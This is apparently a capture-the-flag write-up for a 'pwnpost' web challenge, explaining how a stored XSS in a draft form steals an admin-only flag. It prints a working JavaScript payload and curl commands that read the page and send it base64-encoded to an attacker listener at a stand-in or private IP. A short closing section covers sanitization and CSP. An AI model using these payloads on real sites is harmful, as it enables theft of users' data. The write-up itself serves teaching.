## 🛡️ Writeup: XSS Challenge – Stealing Admin Draft Using Stored XSS

### 📘 Challenge Summary

We were given a web app named **pwnpost** that allows users to post drafts with an optional publish checkbox. The key challenge is to **steal a flag stored in a draft post created by the `admin` user**. The admin periodically logs in to view drafts, and the flag is only accessible in their session.

---

## 🕳️ Vulnerabilities Identified

### 1. **Stored XSS (Cross-Site Scripting)**

* The draft submission form accepts **unescaped HTML/JavaScript**.
* When the draft is viewed by another user (e.g. admin), the script is executed.
* This opens the door for persistent XSS, where the attacker can inject malicious JavaScript.

### 2. **No Output Encoding / Sanitization**

* The server does **not sanitize or encode the user input** in draft content before rendering it in HTML.
* This leads to JavaScript being executed directly when the admin loads the draft.

---

## 🚩 Goal

**Exfiltrate the draft contents (flag) visible only to the admin**.

---

## 🛠️ Steps to Solve

### ✅ Step 1: Create a malicious payload that will:

* Fetch the homepage (which contains the draft with the flag when viewed by admin).
* Base64 encode the HTML.
* Send it to our listener server (e.g., running with Python or `nc`).

**Payload:**

```html
<script>
fetch("/") 
  .then(res => res.text()) 
  .then(text => { 
    fetch("http://<your-IP>:8000/?flag=" + btoa(text)); 
  });
</script>
```

Replace `<your-IP>` with your real IP (use `ip a` or `curl ifconfig.me`).

---

### ✅ Step 2: Host a listener server to receive the flag

```bash
# Simple listener in Python
python3 -m http.server 8000
```

Or if you want to view requests:

```bash
sudo tcpdump -i any port 8000
```

---

### ✅ Step 3: Inject Payload Using `curl`

Here's how to submit the malicious draft from terminal using `curl`:

```bash
curl -X POST http://<TARGET>/draft \
  -d 'content=<script>fetch("/") .then(res => res.text()) .then(text => { fetch("http://10.49.150.47:8000/?flag=" + btoa(text)); });</script>' \
  -d 'publish=on' \
  -b 'session=<your-session-if-needed>' \
  -v
```

> Replace `<TARGET>` with the vulnerable server (e.g., `127.0.0.1:5000` or as assigned), and `10.49.150.47` with your attacker server IP.

If authentication is needed, perform login first using curl and store cookies:

```bash
# Step 1: Log in and store cookies
curl -c cookies.txt -X POST http://<TARGET>/login -d 'username=hacker&password=hacker'

# Step 2: Inject using stored cookies
curl -b cookies.txt -X POST http://<TARGET>/draft \
  -d 'content=<script>fetch("/") .then(res => res.text()) .then(text => { fetch("http://10.49.150.47:8000/?flag=" + btoa(text)); });</script>' \
  -d 'publish=on'
```

---

### ✅ Step 4: Wait for the Admin

Once the payload is submitted, the admin (simulated bot) will log in, view drafts, and execute the payload. You’ll receive the flag at:

```
http://10.49.150.47:8000/?flag=...
```

Use `base64 -d` to decode the flag if necessary.

---

## ✅ Final Result

From the decoded HTML, the following line shows the flag:

```html
pwn.college{...}
```

## 🔐 Lessons Learned

* **Always sanitize user input**, especially in blog/draft/comment systems.
* **Content Security Policy (CSP)** can help prevent loading external scripts.
* **HttpOnly** cookies can prevent JS from accessing session tokens, but XSS can still steal data rendered on the page.
* Even seemingly harmless features like drafts can be abused to run malicious code if not sanitized.
